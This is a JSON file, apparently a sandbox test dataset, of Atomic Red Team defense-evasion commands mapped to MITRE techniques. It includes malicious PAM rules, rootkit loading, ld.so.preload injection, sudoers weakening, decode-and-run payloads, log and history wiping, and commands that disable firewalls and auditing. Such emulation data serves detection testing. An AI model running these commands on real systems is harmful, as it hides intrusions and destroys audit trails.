@@ -1,0 +1,4241 @@
+[
+{
+"command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}",
+"row_index": 0,
+"sandbox": "1773580199_T1556.003_1_0",
+"tactic": "defense-evasion",
+"technique": "T1556.003",
+"test": "1",
+"test_name": "Malicious PAM rule"
+},
+{
+"command": "sudo sed -i \"\" \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}",
+"row_index": 1,
+"sandbox": "1773580319_T1556.003_2_1",
+"tactic": "defense-evasion",
+"technique": "T1556.003",
+"test": "2",
+"test_name": "Malicious PAM rule (freebsd)"
+},
+{
+"command": "sudo sed -i \"#{index}s,^,#{pam_rule}\\n,g\" #{path_to_pam_conf}",
+"row_index": 2,
+"sandbox": "1773580439_T1556.003_3_2",
+"tactic": "defense-evasion",
+"technique": "T1556.003",
+"test": "3",
+"test_name": "Malicious PAM module"
+},
+{
+"command": "chmod #{numeric_mode} #{file_or_folder}",
+"row_index": 3,
+"sandbox": "1773580559_T1222.002_1_3",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "1",
+"test_name": "chmod - Change file or folder mode (numeric mode)"
+},
+{
+"command": "chmod #{symbolic_mode} #{file_or_folder}",
+"row_index": 4,
+"sandbox": "1773580680_T1222.002_2_4",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "2",
+"test_name": "chmod - Change file or folder mode (symbolic mode)"
+},
+{
+"command": "chmod -R #{numeric_mode} #{file_or_folder}",
+"row_index": 5,
+"sandbox": "1773580800_T1222.002_3_5",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "3",
+"test_name": "chmod - Change file or folder mode (numeric mode) recursively"
+},
+{
+"command": "chmod -R #{symbolic_mode} #{file_or_folder}",
+"row_index": 6,
+"sandbox": "1773580920_T1222.002_4_6",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "4",
+"test_name": "chmod - Change file or folder mode (symbolic mode) recursively"
+},
+{
+"command": "chown #{owner}:#{group} #{file_or_folder}",
+"row_index": 7,
+"sandbox": "1773581040_T1222.002_5_7",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "5",
+"test_name": "chown - Change file or folder ownership and group"
+},
+{
+"command": "chown -R #{owner}:#{group} #{file_or_folder}",
+"row_index": 8,
+"sandbox": "1773581160_T1222.002_6_8",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "6",
+"test_name": "chown - Change file or folder ownership and group recursively"
+},
+{
+"command": "chown #{owner} #{file_or_folder}",
+"row_index": 9,
+"sandbox": "1773581280_T1222.002_7_9",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "7",
+"test_name": "chown - Change file or folder mode ownership only"
+},
+{
+"command": "chown -R #{owner} #{file_or_folder}",
+"row_index": 10,
+"sandbox": "1773581400_T1222.002_8_10",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "8",
+"test_name": "chown - Change file or folder ownership recursively"
+},
+{
+"command": "chattr -i #{file_to_modify}",
+"row_index": 11,
+"sandbox": "1773581520_T1222.002_9_11",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "9",
+"test_name": "chattr - Remove immutable file attribute"
+},
+{
+"command": "touch #{file_to_modify} && chflags simmutable #{file_to_modify} && chflags nosimmutable #{file_to_modify}",
+"row_index": 12,
+"sandbox": "1773581640_T1222.002_10_12",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "10",
+"test_name": "chflags - Remove immutable file attribute"
+},
+{
+"command": "#{compiled_file} /tmp/ T1222002",
+"row_index": 13,
+"sandbox": "1773581761_T1222.002_11_13",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "11",
+"test_name": "Chmod through c script"
+},
+{
+"command": "#{compiled_file} /tmp/ T1222002",
+"row_index": 14,
+"sandbox": "1773581881_T1222.002_12_14",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "12",
+"test_name": "Chmod through c script (freebsd)"
+},
+{
+"command": "sudo #{compiled_file} #{source_file}",
+"row_index": 15,
+"sandbox": "1773582001_T1222.002_13_15",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "13",
+"test_name": "Chown through c script"
+},
+{
+"command": "#{compiled_file} #{source_file}",
+"row_index": 16,
+"sandbox": "1773582121_T1222.002_14_16",
+"tactic": "defense-evasion",
+"technique": "T1222.002",
+"test": "14",
+"test_name": "Chown through c script (freebsd)"
+},
+{
+"command": "$encodedString = \"WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=\" && $bytes = [System.Convert]::FromBase64String($encodedString) && $decodedString = [System.Text.Encoding]::UTF8.GetString($bytes) && #write the decoded eicar string to file && $decodedString | Out-File T1027.013_decodedEicar.txt",
+"row_index": 17,
+"sandbox": "1773582241_T1027.013_1_17",
+"tactic": "defense-evasion",
+"technique": "T1027.013",
+"test": "1",
+"test_name": "Decode Eicar File and Write to File"
+},
+{
+"command": "$encryptedString = \"76492d1116743f0423413b16050a5345MgB8AGkASwA0AHMAbwBXAFoAagBkAFoATABXAGIAdAA5AFcAWAB1AFMANABVAEEAPQA9AHwAZQBjAGMANgAwADQAZAA0AGQAMQAwADUAYgA4ADAAMgBmADkAZgBjADEANQBjAGMANQBiAGMANwA2AGYANQBmADUANABhAGIAYgAyAGMANQA1AGQAMgA5ADEANABkADUAMgBiAGMANgA2AGMAMAAxADUAZABjADAAOABjAGIANAA1ADUANwBjADcAZQBlAGQAYgAxADEAOQA4AGIAMwAwADMANwAwADAANQA2ADQAOAA4ADkAZgA4ADMAZQA4ADgAOQBiAGEAMAA2ADMAMQAyADYAMwBiAGUAMAAxADgANAA0ADYAOAAxADQANQAwAGUANwBkADkANABjADcANQAxADgAYQA2ADMANQA4AGIAYgA1ADkANQAzAGIAMwAxADYAOAAwADQAMgBmADcAZQBjADYANQA5AGIANwBkADUAOAAyAGEAMgBiADEAMQAzAGQANABkADkAZgA3ADMAMABiADgAOQAxADAANAA4ADcAOQA5ADEAYQA1ADYAZAAzADQANwA3AGYANgAyADcAMAAwADEAMQA4ADEAZgA5ADUAYgBmAGYANQA3ADQAZQA4AGUAMAAxADUANwAwAGQANABiADMAMwA2ADgANwA0AGIANwAyADMAMQBhADkAZABhADEANQAzADQAMgAzADEANwAxADAAZgAxADkAYQA1ADEAMQA=\" && $key = [byte]1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 && $decrypt = ConvertTo-SecureString -String $encryptedString -Key $key && $decryptedString = [Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($decrypt)) && #Write the decrypted eicar string to a file && $decryptedString | out-file T1027.013_decryptedEicar.txt",
+"row_index": 18,
+"sandbox": "1773582361_T1027.013_2_18",
+"tactic": "defense-evasion",
+"technique": "T1027.013",
+"test": "2",
+"test_name": "Decrypt Eicar File and Write to File"
+},
+{
+"command": "sudo insmod #{rootkit_path}/#{rootkit_name}.ko",
+"row_index": 19,
+"sandbox": "1773582481_T1014_1_19",
+"tactic": "defense-evasion",
+"technique": "T1014",
+"test": "1",
+"test_name": "Loadable Kernel Module based Rootkit"
+},
+{
+"command": "sudo modprobe #{rootkit_name}",
+"row_index": 20,
+"sandbox": "1773582601_T1014_2_20",
+"tactic": "defense-evasion",
+"technique": "T1014",
+"test": "2",
+"test_name": "Loadable Kernel Module based Rootkit"
+},
+{
+"command": "echo #{library_path} | tee -a /etc/ld.so.preload && /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\"",
+"row_index": 21,
+"sandbox": "1773582721_T1014_3_21",
+"tactic": "defense-evasion",
+"technique": "T1014",
+"test": "3",
+"test_name": "dynamic-linker based rootkit (libprocesshider)"
+},
+{
+"command": "sudo modprobe #{rootkit_name} && ping -c 10 localhost >/dev/null & TARGETPID=\"$!\" && ps $TARGETPID && kill -31 $TARGETPID && ps $TARGETPID || echo \"process ${TARGETPID} hidden\"",
+"row_index": 22,
+"sandbox": "1773582841_T1014_4_22",
+"tactic": "defense-evasion",
+"technique": "T1014",
+"test": "4",
+"test_name": "Loadable Kernel Module based Rootkit (Diamorphine)"
+},
+{
+"command": "sudo -l && sudo cat /etc/sudoers && sudo vim /etc/sudoers",
+"row_index": 23,
+"sandbox": "1773582962_T1548.003_1_23",
+"tactic": "defense-evasion",
+"technique": "T1548.003",
+"test": "1",
+"test_name": "Sudo usage"
+},
+{
+"command": "sudo -l && sudo cat /usr/local/etc/sudoers && sudo ee /usr/local/etc/sudoers",
+"row_index": 24,
+"sandbox": "1773583082_T1548.003_2_24",
+"tactic": "defense-evasion",
+"technique": "T1548.003",
+"test": "2",
+"test_name": "Sudo usage (freebsd)"
+},
+{
+"command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers && sudo visudo -c -f /etc/sudoers",
+"row_index": 25,
+"sandbox": "1773583202_T1548.003_3_25",
+"tactic": "defense-evasion",
+"technique": "T1548.003",
+"test": "3",
+"test_name": "Unlimited sudo cache timeout"
+},
+{
+"command": "sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers && sudo visudo -c -f /usr/local/etc/sudoers",
+"row_index": 26,
+"sandbox": "1773583322_T1548.003_4_26",
+"tactic": "defense-evasion",
+"technique": "T1548.003",
+"test": "4",
+"test_name": "Unlimited sudo cache timeout (freebsd)"
+},
+{
+"command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /etc/sudoers\" && sudo visudo -c -f /etc/sudoers",
+"row_index": 27,
+"sandbox": "1773583442_T1548.003_5_27",
+"tactic": "defense-evasion",
+"technique": "T1548.003",
+"test": "5",
+"test_name": "Disable tty_tickets for sudo caching"
+},
+{
+"command": "sudo sh -c \"echo Defaults \"'!'\"tty_tickets >> /usr/local/etc/sudoers\" && sudo visudo -c -f /usr/local/etc/sudoers",
+"row_index": 28,
+"sandbox": "1773583562_T1548.003_6_28",
+"tactic": "defense-evasion",
+"technique": "T1548.003",
+"test": "6",
+"test_name": "Disable tty_tickets for sudo caching (freebsd)"
+},
+{
+"command": "mkdir $HOME/... && cp $(which sh) $HOME/... && $HOME/.../sh -c \"echo #{test_message}\"",
+"row_index": 29,
+"sandbox": "1773583682_T1036.005_1_29",
+"tactic": "defense-evasion",
+"technique": "T1036.005",
+"test": "1",
+"test_name": "Execute a process from a directory masquerading as the current parent directory"
+},
+{
+"command": "if (systemd-detect-virt) then echo \"Virtualization Environment detected\"; fi; && if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo \"Virtualization Environment detected\"; fi;",
+"row_index": 30,
+"sandbox": "1773583802_T1497.001_1_30",
+"tactic": "defense-evasion",
+"technique": "T1497.001",
+"test": "1",
+"test_name": "Detect Virtualization Environment (Linux)"
+},
+{
+"command": "if [ \"$(sysctl -n hw.hv_vendor)\" != \"\" ]; then echo \"Virtualization Environment detected\"; fi",
+"row_index": 31,
+"sandbox": "1773583922_T1497.001_2_31",
+"tactic": "defense-evasion",
+"technique": "T1497.001",
+"test": "2",
+"test_name": "Detect Virtualization Environment (FreeBSD)"
+},
+{
+"command": "sudo rm -rf #{syslog_path} && if [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi",
+"row_index": 32,
+"sandbox": "1773584042_T1070.002_1_32",
+"tactic": "defense-evasion",
+"technique": "T1070.002",
+"test": "1",
+"test_name": "rm -rf"
+},
+{
+"command": "rm -rf /var/log/messages && rm -rf /var/log/security",
+"row_index": 33,
+"sandbox": "1773584163_T1070.002_2_33",
+"tactic": "defense-evasion",
+"technique": "T1070.002",
+"test": "2",
+"test_name": "rm -rf"
+},
+{
+"command": "truncate -s 0 /var/log/messages #size parameter shorthand && truncate --size=0 /var/log/security #size parameter",
+"row_index": 34,
+"sandbox": "1773584283_T1070.002_5_34",
+"tactic": "defense-evasion",
+"technique": "T1070.002",
+"test": "5",
+"test_name": "Truncate system log files via truncate utility (freebsd)"
+},
+{
+"command": "cat /dev/null > /var/log/messages #truncating the file to zero bytes && cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)",
+"row_index": 35,
+"sandbox": "1773584403_T1070.002_7_35",
+"tactic": "defense-evasion",
+"technique": "T1070.002",
+"test": "7",
+"test_name": "Delete log files via cat utility by appending /dev/null or /dev/zero (freebsd)"
+},
+{
+"command": "echo '' > /var/log/messages",
+"row_index": 36,
+"sandbox": "1773584523_T1070.002_10_36",
+"tactic": "defense-evasion",
+"technique": "T1070.002",
+"test": "10",
+"test_name": "Overwrite FreeBSD system log via echo utility"
+},
+{
+"command": "unlink /var/log/messages",
+"row_index": 37,
+"sandbox": "1773584643_T1070.002_13_37",
+"tactic": "defense-evasion",
+"technique": "T1070.002",
+"test": "13",
+"test_name": "Delete system log files via unlink utility (freebsd)"
+},
+{
+"command": "sudo rm #{journal_folder}/* #physically deletes the journal files, and not just their content && sudo journalctl --vacuum-time=0 #clears the journal while still keeping the journal files in place",
+"row_index": 38,
+"sandbox": "1773584763_T1070.002_18_38",
+"tactic": "defense-evasion",
+"technique": "T1070.002",
+"test": "18",
+"test_name": "Delete system journal logs via rm and journalctl utilities"
+},
+{
+"command": "echo 0> /var/spool/mail/#{username}",
+"row_index": 39,
+"sandbox": "1773584883_T1070.002_19_39",
+"tactic": "defense-evasion",
+"technique": "T1070.002",
+"test": "19",
+"test_name": "Overwrite Linux Mail Spool"
+},
+{
+"command": "echo 0> #{log_path}",
+"row_index": 40,
+"sandbox": "1773585003_T1070.002_20_40",
+"tactic": "defense-evasion",
+"technique": "T1070.002",
+"test": "20",
+"test_name": "Overwrite Linux Log"
+},
+{
+"command": "rm #{history_path}",
+"row_index": 41,
+"sandbox": "1773585123_T1070.003_1_41",
+"tactic": "defense-evasion",
+"technique": "T1070.003",
+"test": "1",
+"test_name": "Clear Bash history (rm)"
+},
+{
+"command": "echo \"\" > #{history_path}",
+"row_index": 42,
+"sandbox": "1773585243_T1070.003_2_42",
+"tactic": "defense-evasion",
+"technique": "T1070.003",
+"test": "2",
+"test_name": "Clear Bash history (echo)"
+},
+{
+"command": "cat /dev/null > #{history_path}",
+"row_index": 43,
+"sandbox": "1773585364_T1070.003_3_43",
+"tactic": "defense-evasion",
+"technique": "T1070.003",
+"test": "3",
+"test_name": "Clear Bash history (cat dev/null)"
+},
+{
+"command": "ln -sf /dev/null #{history_path}",
+"row_index": 44,
+"sandbox": "1773585484_T1070.003_4_44",
+"tactic": "defense-evasion",
+"technique": "T1070.003",
+"test": "4",
+"test_name": "Clear Bash history (ln dev/null)"
+},
+{
+"command": "truncate -s0 #{history_path}",
+"row_index": 45,
+"sandbox": "1773585604_T1070.003_5_45",
+"tactic": "defense-evasion",
+"technique": "T1070.003",
+"test": "5",
+"test_name": "Clear Bash history (truncate)"
+},
+{
+"command": "unset HISTFILE && export HISTFILESIZE=0 && history -c",
+"row_index": 46,
+"sandbox": "1773585724_T1070.003_6_46",
+"tactic": "defense-evasion",
+"technique": "T1070.003",
+"test": "6",
+"test_name": "Clear history of a bunch of shells"
+},
+{
+"command": "set +o history && echo 'set +o history' >> ~/.bashrc && . ~/.bashrc && history -c",
+"row_index": 47,
+"sandbox": "1773585844_T1070.003_7_47",
+"tactic": "defense-evasion",
+"technique": "T1070.003",
+"test": "7",
+"test_name": "Clear and Disable Bash History Logging"
+},
+{
+"command": "hostname && whoami",
+"row_index": 48,
+"sandbox": "1773585964_T1070.003_8_48",
+"tactic": "defense-evasion",
+"technique": "T1070.003",
+"test": "8",
+"test_name": "Use Space Before Command to Avoid Logging to History"
+},
+{
+"command": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname",
+"row_index": 49,
+"sandbox": "1773586084_T1070.003_9_49",
+"tactic": "defense-evasion",
+"technique": "T1070.003",
+"test": "9",
+"test_name": "Disable Bash History Logging with SSH -T"
+},
+{
+"command": "docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log",
+"row_index": 50,
+"sandbox": "1773586204_T1070.003_10_50",
+"tactic": "defense-evasion",
+"technique": "T1070.003",
+"test": "10",
+"test_name": "Clear Docker Container Logs"
+},
+{
+"command": "ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(\"#{message}\".encode());print(enc.decode())') && python3 -c \"import base64;dec=base64.b64decode(\\\"$ENCODED\\\");print(dec.decode())\" && python3 -c \"import base64 as d;dec=d.b64decode(\\\"$ENCODED\\\");print(dec.decode())\" && python3 -c \"from base64 import b64decode;dec=b64decode(\\\"$ENCODED\\\");print(dec.decode())\" && python3 -c \"from base64 import b64decode as d;dec=d(\\\"$ENCODED\\\");print(dec.decode())\" && echo $ENCODED | python3 -c \"import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())\" && echo $ENCODED > #{encoded_file} && python3 -c \"import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())\"",
+"row_index": 51,
+"sandbox": "1773586324_T1140_3_51",
+"tactic": "defense-evasion",
+"technique": "T1140",
+"test": "3",
+"test_name": "Base64 decoding with Python"
+},
+{
+"command": "ENCODED=$(perl -e \"use MIME::Base64;print(encode_base64('#{message}'));\") && perl -le \"use MIME::Base64;print(decode_base64('$ENCODED'));\" && echo $ENCODED | perl -le 'use MIME::Base64;print(decode_base64(<STDIN>));' && echo $ENCODED > #{encoded_file} && perl -le 'use MIME::Base64;open($f,\"<\",\"#{encoded_file}\");print(decode_base64(<$f>));'",
+"row_index": 52,
+"sandbox": "1773586444_T1140_4_52",
+"tactic": "defense-evasion",
+"technique": "T1140",
+"test": "4",
+"test_name": "Base64 decoding with Perl"
+},
+{
+"command": "ENCODED=$(echo '#{message}' | base64) && printf $ENCODED | base64 -d && echo $ENCODED | base64 -d && echo $(echo $ENCODED) | base64 -d && echo $ENCODED > #{encoded_file} && base64 -d #{encoded_file} && echo $ENCODED > #{encoded_file} && base64 -d < #{encoded_file} && echo $ENCODED > #{encoded_file} && cat #{encoded_file} | base64 -d && echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | base64 -d && bash -c \"{echo,\\\"$(echo $ENCODED)\\\"}|{base64,-d}\"",
+"row_index": 53,
+"sandbox": "1773586565_T1140_5_53",
+"tactic": "defense-evasion",
+"technique": "T1140",
+"test": "5",
+"test_name": "Base64 decoding with shell utilities"
+},
+{
+"command": "ENCODED=$(echo '#{message}' | b64encode -r -) && printf $ENCODED | b64decode -r && echo $ENCODED | b64decode -r && echo $(echo $ENCODED) | b64decode -r && echo $ENCODED > #{encoded_file} && b64encode -r #{encoded_file} && echo $ENCODED > #{encoded_file} && b64decode -r < #{encoded_file} && echo $ENCODED > #{encoded_file} && cat #{encoded_file} | b64decode -r && echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | b64decode -r",
+"row_index": 54,
+"sandbox": "1773586685_T1140_6_54",
+"tactic": "defense-evasion",
+"technique": "T1140",
+"test": "6",
+"test_name": "Base64 decoding with shell utilities (freebsd)"
+},
+{
+"command": "echo #{bash_encoded} | b64decode -r | sh && echo #{dash_encoded} | b64decode -r | sh && echo #{fish_encoded} | b64decode -r | sh && echo #{sh_encoded} | b64decode -r | sh",
+"row_index": 55,
+"sandbox": "1773586805_T1140_7_55",
+"tactic": "defense-evasion",
+"technique": "T1140",
+"test": "7",
+"test_name": "FreeBSD b64encode Shebang in CLI"
+},
+{
+"command": "ENCODED=$(echo '#{message}' | xxd -ps -c 256) && printf $ENCODED | xxd -r -p && echo $ENCODED | xxd -r -p && echo $(echo $ENCODED) | xxd -r -p && echo $ENCODED > #{encoded_file} && xxd -r -p #{encoded_file} && echo $ENCODED > #{encoded_file} && xxd -r -p < #{encoded_file} && echo $ENCODED > #{encoded_file} && cat #{encoded_file} | xxd -r -p && echo $ENCODED > #{encoded_file} && cat < #{encoded_file} | xxd -r -p",
+"row_index": 56,
+"sandbox": "1773586925_T1140_8_56",
+"tactic": "defense-evasion",
+"technique": "T1140",
+"test": "8",
+"test_name": "Hex decoding with shell utilities"
+},
+{
+"command": "echo #{bash_encoded} | base64 -d | bash && echo #{dash_encoded} | base64 -d | bash && echo #{fish_encoded} | base64 -d | bash && echo #{sh_encoded} | base64 -d | bash",
+"row_index": 57,
+"sandbox": "1773587045_T1140_9_57",
+"tactic": "defense-evasion",
+"technique": "T1140",
+"test": "9",
+"test_name": "Linux Base64 Encoded Shebang in CLI"
+},
+{
+"command": "python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: \"\".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = \"#{encrypted_command}\"; key = \"#{xor_key}\"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'",
+"row_index": 58,
+"sandbox": "1773587165_T1140_10_58",
+"tactic": "defense-evasion",
+"technique": "T1140",
+"test": "10",
+"test_name": "XOR decoding and command execution using Python"
+},
+{
+"command": "sudo systemctl stop systemd-journald #disables journal logging",
+"row_index": 59,
+"sandbox": "1773587285_T1562_2_59",
+"tactic": "defense-evasion",
+"technique": "T1562",
+"test": "2",
+"test_name": "Disable journal logging via systemctl utility"
+},
+{
+"command": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf",
+"row_index": 60,
+"sandbox": "1773587405_T1562_3_60",
+"tactic": "defense-evasion",
+"technique": "T1562",
+"test": "3",
+"test_name": "Disable journal logging via sed utility"
+},
+{
+"command": "mkdir -p /var/spool/mail/copy && for file in /var/spool/mail/*; do if [ \"$(basename \"$file\")\" != \"copy\" ]; then cp -R \"$file\" /var/spool/mail/copy/; fi; done && rm -rf /var/spool/mail/copy/*",
+"row_index": 61,
+"sandbox": "1773587525_T1070.008_2_61",
+"tactic": "defense-evasion",
+"technique": "T1070.008",
+"test": "2",
+"test_name": "Copy and Delete Mailbox Data on Linux"
+},
+{
+"command": "mkdir -p /var/spool/mail/copy; for file in /var/spool/mail/*; do if [ \"$(basename \"$file\")\" != \"copy\" ]; then cp -R \"$file\" /var/spool/mail/copy/; if [ -f \"/var/spool/mail/copy/$(basename \"$file\")\" ]; then echo \"Modification for Atomic Red Test\" >> \"/var/spool/mail/copy/$(basename \"$file\")\"; fi; fi; done",
+"row_index": 62,
+"sandbox": "1773587646_T1070.008_5_62",
+"tactic": "defense-evasion",
+"technique": "T1070.008",
+"test": "5",
+"test_name": "Copy and Modify Mailbox Data on Linux"
+},
+{
+"command": "touch -a -t 197001010000.00 #{target_filename}",
+"row_index": 63,
+"sandbox": "1773587766_T1070.006_1_63",
+"tactic": "defense-evasion",
+"technique": "T1070.006",
+"test": "1",
+"test_name": "Set a file's access timestamp"
+},
+{
+"command": "touch -m -t 197001010000.00 #{target_filename}",
+"row_index": 64,
+"sandbox": "1773587886_T1070.006_2_64",
+"tactic": "defense-evasion",
+"technique": "T1070.006",
+"test": "2",
+"test_name": "Set a file's modification timestamp"
+},
+{
+"command": "NOW=$(date +%m%d%H%M%Y) && date 010100001971 && touch #{target_filename} && date \"$NOW\" && stat #{target_filename}",
+"row_index": 65,
+"sandbox": "1773588006_T1070.006_3_65",
+"tactic": "defense-evasion",
+"technique": "T1070.006",
+"test": "3",
+"test_name": "Set a file's creation timestamp"
+},
+{
+"command": "touch #{target_file_path} && touch -acmr #{reference_file_path} #{target_file_path}",
+"row_index": 66,
+"sandbox": "1773588126_T1070.006_4_66",
+"tactic": "defense-evasion",
+"technique": "T1070.006",
+"test": "4",
+"test_name": "Modify file timestamps using reference file"
+},
+{
+"command": "ping -c #{ping_count} 8.8.8.8 > /dev/null && #{evil_command}",
+"row_index": 67,
+"sandbox": "1773588246_T1497.003_1_67",
+"tactic": "defense-evasion",
+"technique": "T1497.003",
+"test": "1",
+"test_name": "Delay execution with ping"
+},
+{
+"command": "ufw disable",
+"row_index": 68,
+"sandbox": "1773588366_T1562.004_7_68",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "7",
+"test_name": "Stop/Start UFW firewall"
+},
+{
+"command": "service pf stop && service pf disable",
+"row_index": 69,
+"sandbox": "1773588486_T1562.004_8_69",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "8",
+"test_name": "Stop/Start Packet Filter"
+},
+{
+"command": "systemctl stop ufw",
+"row_index": 70,
+"sandbox": "1773588606_T1562.004_9_70",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "9",
+"test_name": "Stop/Start UFW firewall systemctl"
+},
+{
+"command": "ufw logging off",
+"row_index": 71,
+"sandbox": "1773588727_T1562.004_10_71",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "10",
+"test_name": "Turn off UFW logging"
+},
+{
+"command": "ufw prepend deny from 1.2.3.4 && ufw status numbered",
+"row_index": 72,
+"sandbox": "1773588847_T1562.004_11_72",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "11",
+"test_name": "Add and delete UFW firewall rules"
+},
+{
+"command": "echo \"block in proto tcp from 1.2.3.4 to any\" | pfctl -a pf-rules -f - && pfctl -a pf-rules -s rules",
+"row_index": 73,
+"sandbox": "1773588967_T1562.004_12_73",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "12",
+"test_name": "Add and delete Packet Filter rules"
+},
+{
+"command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules && grep \"# THIS IS A COMMENT\" /etc/ufw/user.rules",
+"row_index": 74,
+"sandbox": "1773589087_T1562.004_13_74",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "13",
+"test_name": "Edit UFW firewall user.rules file"
+},
+{
+"command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf && grep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf",
+"row_index": 75,
+"sandbox": "1773589207_T1562.004_14_75",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "14",
+"test_name": "Edit UFW firewall ufw.conf file"
+},
+{
+"command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf && grep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf",
+"row_index": 76,
+"sandbox": "1773589327_T1562.004_15_76",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "15",
+"test_name": "Edit UFW firewall sysctl.conf file"
+},
+{
+"command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw && grep \"# THIS IS A COMMENT\" /etc/default/ufw",
+"row_index": 77,
+"sandbox": "1773589447_T1562.004_16_77",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "16",
+"test_name": "Edit UFW firewall main configuration file"
+},
+{
+"command": "tail /var/log/ufw.log",
+"row_index": 78,
+"sandbox": "1773589567_T1562.004_17_78",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "17",
+"test_name": "Tail the UFW firewall log file"
+},
+{
+"command": "iptables-save > /tmp/iptables.rules && iptables -F",
+"row_index": 79,
+"sandbox": "1773589687_T1562.004_18_79",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "18",
+"test_name": "Disable iptables"
+},
+{
+"command": "iptables -D OUTPUT -p tcp --dport 21 -j DROP",
+"row_index": 80,
+"sandbox": "1773589808_T1562.004_19_80",
+"tactic": "defense-evasion",
+"technique": "T1562.004",
+"test": "19",
+"test_name": "Modify/delete iptables firewall rules"
+},
+{
+"command": "auditctl -D",
+"row_index": 81,
+"sandbox": "1773589928_T1562.012_1_81",
+"tactic": "defense-evasion",
+"technique": "T1562.012",
+"test": "1",
+"test_name": "Delete all auditd rules using auditctl"
+},
+{
+"command": "auditctl -e 0",
+"row_index": 82,
+"sandbox": "1773590048_T1562.012_2_82",
+"tactic": "defense-evasion",
+"technique": "T1562.012",
+"test": "2",
+"test_name": "Disable auditd using auditctl"
+},
+{
+"command": "dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes && dd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data && dd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data",
+"row_index": 83,
+"sandbox": "1773590168_T1027.001_1_83",
+"tactic": "defense-evasion",
+"technique": "T1027.001",
+"test": "1",
+"test_name": "Pad Binary to Change Hash - Linux/macOS dd"
+},
+{
+"command": "truncate -s +1 #{file_to_pad} #adds a byte to the file size",
+"row_index": 84,
+"sandbox": "1773590288_T1027.001_2_84",
+"tactic": "defense-evasion",
+"technique": "T1027.001",
+"test": "2",
+"test_name": "Pad Binary to Change Hash using truncate command - Linux/macOS"
+},
+{
+"command": "sudo sh -c 'echo #{path_to_shared_library} > /etc/ld.so.preload'",
+"row_index": 85,
+"sandbox": "1773590408_T1574.006_1_85",
+"tactic": "defense-evasion",
+"technique": "T1574.006",
+"test": "1",
+"test_name": "Shared Library Injection via /etc/ld.so.preload"
+},
+{
+"command": "LD_PRELOAD=#{path_to_shared_library} ls",
+"row_index": 86,
+"sandbox": "1773590528_T1574.006_2_86",
+"tactic": "defense-evasion",
+"technique": "T1574.006",
+"test": "2",
+"test_name": "Shared Library Injection via LD_PRELOAD"
+},
+{
+"command": "cp #{payload} /tmp/hello.c && sudo chown root /tmp/hello.c && sudo make /tmp/hello && sudo chown root /tmp/hello && sudo chmod u+s /tmp/hello && /tmp/hello",
+"row_index": 87,
+"sandbox": "1773590648_T1548.001_1_87",
+"tactic": "defense-evasion",
+"technique": "T1548.001",
+"test": "1",
+"test_name": "Make and modify binary from C source"
+},
+{
